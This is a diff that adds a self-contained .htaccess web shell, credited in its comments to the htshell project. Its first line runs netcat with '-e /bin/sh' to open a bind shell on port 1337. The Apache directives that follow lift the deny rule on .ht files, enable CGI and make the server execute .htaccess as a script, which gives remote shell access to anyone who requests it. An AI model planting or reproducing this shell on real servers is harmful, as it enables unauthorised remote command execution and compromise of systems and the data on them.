@@ -1,0 +1,17 @@
+#!/bin/nc -e /bin/sh -l -p 1337 &
+# Self contained .htaccess web shell - Part of the htshell project
+# Written by Wireghoul - http://www.justanotherhacker.com
+# Spawns a shell on port 1337
+
+# Override default deny rule to make .htaccess file accessible over web
+<Files ~ "^\.ht">
+    Order allow,deny
+    Allow from all
+</Files>
+
+# Enable  CGI
+Options +ExecCGI
+
+#Make apache treat .htaccess as a cgi file
+AddHandler cgi-script .htaccess
+
